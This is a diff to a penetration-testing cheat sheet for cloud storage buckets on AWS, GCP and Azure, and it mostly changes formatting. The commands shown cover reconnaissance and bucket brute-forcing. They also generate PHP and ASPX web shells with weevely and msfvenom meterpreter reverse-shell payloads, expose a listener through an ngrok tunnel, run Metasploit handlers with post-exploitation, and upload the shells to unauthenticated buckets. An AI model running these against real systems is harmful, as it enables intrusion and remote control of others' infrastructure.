@@ -2,7 +2,7 @@
 
 ## Check List
 
-* [ ] _Assess that the access control configuration for the storage services is properly in place._
+* [ ] Assess that the access control configuration for the storage services is properly in place.
 
 ## Cheat Sheet
 
@@ -10,7 +10,9 @@
 
 #### [Host](https://linux.die.net/man/1/host)
 
-_Domain to IP_
+{% hint style="info" %}
+Domain to IP
+{% endhint %}
 
 ```bash
 host $WEBSITE
@@ -18,13 +20,17 @@ host $WEBSITE
 
 #### [Whois](https://who.is)
 
-_Company Info_
+{% hint style="info" %}
+Company Info
+{% endhint %}
 
 ```bash
 whois $WEBSITE
 ```
 
-_IP to ASN_
+{% hint style="info" %}
+IP to ASN
+{% endhint %}
 
 ```bash
 whois -h whois.cymru.com -v $TARGET
@@ -32,13 +38,17 @@ whois -h whois.cymru.com -v $TARGET
 
 #### [cURL](https://curl.se/)
 
-_HTTP Headers_
+{% hint style="info" %}
+HTTP Headers
+{% endhint %}
 
 ```bash
 curl -I $WEBSITE
 ```
 
-_Check Robots_
+{% hint style="info" %}
+Check Robots
+{% endhint %}
 
 ```bash
 curl $WEBSITE/robots.txt
@@ -48,7 +58,9 @@ curl $WEBSITE/robots.txt
 
 #### [DNSEnum](https://github.com/fwaeytens/dnsenum)
 
-_DNS Records_
+{% hint style="info" %}
+DNS Records
+{% endhint %}
 
 ```bash
 dnsenum $WEBSITE
@@ -64,7 +76,9 @@ dig +short $WEBSITE
 
 #### [SubFinder ](https://github.com/projectdiscovery/subfinder)& [ShuffleDNS](https://github.com/projectdiscovery/shuffledns)
 
-_Subdomains_
+{% hint style="info" %}
+Subdomains
+{% endhint %}
 
 ```bash
 echo "1.1.1.1" > /tmp/resolvers.txt; \
@@ -76,19 +90,25 @@ shuffledns -d $WEBSITE -r /tmp/resolvers.txt -mode resolve
 
 #### [Katana](https://github.com/projectdiscovery/katana)
 
+{% hint style="info" %}
 GCP
+{% endhint %}
 
 ```bash
 katana -u $WEBSITE -jc -d 5 | grep -Eo "https?://[^ ]+storage\.googleapis\.com[^ ]*"
 ```
 
+{% hint style="info" %}
 AWS
+{% endhint %}
 
 ```bash
 katana -u $WEBSITE -jc -d 5 | grep -Eo "https?://[^ ]+s3[^ ]+\.amazonaws\.com"
 ```
 
+{% hint style="info" %}
 Azure
+{% endhint %}
 
 ```bash
 katana -u $WEBSITE -jc -d 5 | grep -Eo "https?://[^ ]+s3[^ ]+\.blob.core.windows\.net"
@@ -104,19 +124,25 @@ curl -s "https://crt.sh/?q=%25.$WEBSITE&output=json" | jq .
 
 ### [Wayback Machine](https://web.archive.org/)
 
+{% hint style="info" %}
 GCP
+{% endhint %}
 
 ```bash
 echo $WEBSITE | gau | grep -E "storage\.googleapis\.com|.*\.storage.googleapis.com"
 ```
 
+{% hint style="info" %}
 AWS
+{% endhint %}
 
 ```bash
 echo $WEBSITE | gau | grep -E "s3\.[a-z0-9-]+\.amazonaws\.com|s3\.amazonaws\.com"
 ```
 
+{% hint style="info" %}
 Azure
+{% endhint %}
 
 ```bash
 echo $WEBSITE | gau | grep -E "s3\.[a-z0-9-]+\.blob.core.windows\.net|s3\.blob.core.windows\.net"
@@ -124,21 +150,27 @@ echo $WEBSITE | gau | grep -E "s3\.[a-z0-9-]+\.blob.core.windows\.net|s3\.blob.c
 
 #### [Nmap](https://nmap.org/)
 
+{% hint style="info" %}
 GCP
+{% endhint %}
 
 ```bash
 nmap -p 80,443 \
      --script http-title,http-headers $BUCKET.storage.googleapis.com
 ```
 
+{% hint style="info" %}
 AWS
+{% endhint %}
 
 ```bash
 nmap -p 80,443 \
      --script http-title,s3open $BUCKET.s3.amazonaws.com
 ```
 
+{% hint style="info" %}
 Azure
+{% endhint %}
 
 ```bash
 nmap -p 80,443 \
@@ -156,21 +188,27 @@ nuclei -u $WEBSITE \
 
 #### [Google](https://www.google.com/)
 
+{% hint style="info" %}
 [GCP](https://cloud.google.com)
+{% endhint %}
 
 ```bash
 site:$WEBSITE inurl:"storage.googleapis.com" | 
 site:$WEBSITE inurl:"googleusercontent.com"
 ```
 
+{% hint style="info" %}
 [AWS](https://aws.amazon.com)
+{% endhint %}
 
 ```bash
 site:$WEBSITE inurl:"amazonaws.com" | 
 site:s3.amazonaws.com $WEBSITE
 ```
 
+{% hint style="info" %}
 [Azure](https://azure.microsoft.com)
+{% endhint %}
 
 ```bash
 site:$WEBSITE inurl:"blob.core.windows.com" | 
@@ -191,7 +229,9 @@ services.http.response.body: {"s3.amazonaws.com", "storage.googleapis.com", "blo
 
 #### [CloudBrute](https://github.com/0xsha/CloudBrute)
 
+{% hint style="info" %}
 GCP
+{% endhint %}
 
 ```bash
 wget https://raw.githubusercontent.com/RhinoSecurityLabs/GCPBucketBrute/refs/heads/master/permutations.txt \
@@ -202,7 +242,9 @@ cloudbrute discover \
     -w /tmp/gcp_buckets.txt
 ```
 
+{% hint style="info" %}
 AWS
+{% endhint %}
 
 ```bash
 wget https://raw.githubusercontent.com/koaj/aws-s3-bucket-wordlist/refs/heads/master/list.txt \
@@ -213,7 +255,9 @@ cloudbrute discover \
     -w /tmp/s3_bucket_list.txt
 ```
 
+{% hint style="info" %}
 Azure
+{% endhint %}
 
 ```bash
 wget https://raw.githubusercontent.com/Macmod/goblob/refs/heads/main/wordlists/goblob-folder-names.txt \
@@ -238,13 +282,17 @@ nmap -p 80,443 \
 
 #### [**Weevely**](https://github.com/epinna/weevely3)
 
-_Create Web Shell PHP_
+{% hint style="info" %}
+Create Web Shell PHP
+{% endhint %}
 
 ```bash
 weevely generate 00980098 /tmp/unk9vvn.php
 ```
 
-_Create Web Shell ASPX_
+{% hint style="info" %}
+Create Web Shell ASPX
+{% endhint %}
 
 ```bash
 cp /usr/share/webshells/aspx/cmdasp.aspx /tmp/unk9vvn.aspx
@@ -252,13 +300,17 @@ cp /usr/share/webshells/aspx/cmdasp.aspx /tmp/unk9vvn.aspx
 
 #### [**Metasploit**](https://www.metasploit.com/)
 
-_Start Ngrok_
+{% hint style="info" %}
+Start Ngrok
+{% endhint %}
 
 ```bash
 ngrok tcp 4444 >/dev/null 2>&1 &
 ```
 
-_Define ENV Ngrok_
+{% hint style="info" %}
+Define ENV Ngrok
+{% endhint %}
 
 ```bash
 NGINFO=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels); \
@@ -266,7 +318,9 @@ NGHOST=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/([^"]*):.*/\1/p'); \
 NGPORT=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/.*.tcp.*.ngrok.io:([^"]*).*/\1/p')
 ```
 
-_Cert Spoof_
+{% hint style="info" %}
+Cert Spoof
+{% endhint %}
 
 ```bash
 rm -rf /home/$USER/.msf4/loot/*
@@ -277,7 +331,9 @@ msfconsole -qx "
     exit"
 ```
 
-_Post-EXP_
+{% hint style="info" %}
+Post-EXP
+{% endhint %}
 
 ```bash
 cat > /tmp/post-exp.rc << EOF
@@ -296,7 +352,9 @@ bg
 EOF
 ```
 
-_Generate Web shell PHP_
+{% hint style="info" %}
+Generate Web shell PHP
+{% endhint %}
 
 ```bash
 msfvenom -p php/meterpreter/reverse_tcp \
@@ -311,7 +369,9 @@ sed -i "s#eval#<?php eval#g" /tmp/unk9vvn.php
 sed -i "s#));#)); ?>#g" /tmp/unk9vvn.php
 ```
 
-_Generate Web Shell ASP_
+{% hint style="info" %}
+Generate Web Shell ASP
+{% endhint %}
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_winhttps \
@@ -321,7 +381,9 @@ msfvenom -p windows/meterpreter/reverse_winhttps \
          -f asp > /tmp/unk9vvn.aspx
 ```
 
-_Listening Metasploit PHP_
+{% hint style="info" %}
+Listening Metasploit PHP
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -336,7 +398,9 @@ msfconsole -qx "
     run -j"
 ```
 
-_Listening Metaploit ASP_
+{% hint style="info" %}
+Listening Metaploit ASP
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -353,25 +417,33 @@ msfconsole -qx "
 
 #### [**AWS S3**](https://aws.amazon.com/)
 
-_Connection Test_
+{% hint style="info" %}
+Connection Test
+{% endhint %}
 
 ```bash
 aws s3 ls s3://$BUCKET.s3.amazonaws.com --no-sign-request
 ```
 
-_Upload File Testing_
+{% hint style="info" %}
+Upload File Testing
+{% endhint %}
 
 ```bash
 aws s3 cp /tmp/unk9vvn.php s3://$BUCKET.s3.amazonaws.com --no-sign-request
 ```
 
-_Success Upload File Testing_
+{% hint style="info" %}
+Success Upload File Testing
+{% endhint %}
 
 ```bash
 aws s3 cp s3://$BUCKET.s3.amazonaws.com/unk9vvn.php . --no-sign-request
 ```
 
-_HTTP Connection Testing_
+{% hint style="info" %}
+HTTP Connection Testing
+{% endhint %}
 
 ```bash
 curl -I https://$BUCKET.s3.amazonaws.com/unk9vvn.php
@@ -379,25 +451,33 @@ curl -I https://$BUCKET.s3.amazonaws.com/unk9vvn.php
 
 #### [GCP](https://cloud.google.com)
 
-_Connection Test_
+{% hint style="info" %}
+Connection Test
+{% endhint %}
 
 ```bash
 gsutil ls gs://$BUCKET
 ```
 
-_Upload File Testing_
+{% hint style="info" %}
+Upload File Testing
+{% endhint %}
 
 ```bash
 gsutil cp /tmp/unk9vvn.php gs://$BUCKET
 ```
 
-_Success Upload File Testing_
+{% hint style="info" %}
+Success Upload File Testing
+{% endhint %}
 
 ```bash
 gsutil cp gs://$BUCKET/unk9vvn.php .
 ```
 
-_HTTP Connection Testing_
+{% hint style="info" %}
+HTTP Connection Testing
+{% endhint %}
 
 ```bash
 curl -I http://storage.googleapis.com/$BUCKET/unk9vvn.php
@@ -405,7 +485,9 @@ curl -I http://storage.googleapis.com/$BUCKET/unk9vvn.php
 
 #### [Azure](https://azure.microsoft.com)
 
-_Connection Test_
+{% hint style="info" %}
+Connection Test
+{% endhint %}
 
 ```bash
 az storage blob list \
@@ -414,7 +496,9 @@ az storage blob list \
     --output table
 ```
 
-_Upload File Testing_
+{% hint style="info" %}
+Upload File Testing
+{% endhint %}
 
 ```bash
 az storage blob upload \
@@ -425,7 +509,9 @@ az storage blob upload \
     --auth-mode login
 ```
 
-_Success Upload File Testing_
+{% hint style="info" %}
+Success Upload File Testing
+{% endhint %}
 
 ```bash
 az storage blob download 
@@ -436,7 +522,9 @@ az storage blob download
     --auth-mode login
 ```
 
-_HTTP Connection Testing_
+{% hint style="info" %}
+HTTP Connection Testing
+{% endhint %}
 
 ```bash
 curl -I https://$ACCOUNT.blob.core.windows.net/$CONTAINER/unk9vvn.aspx
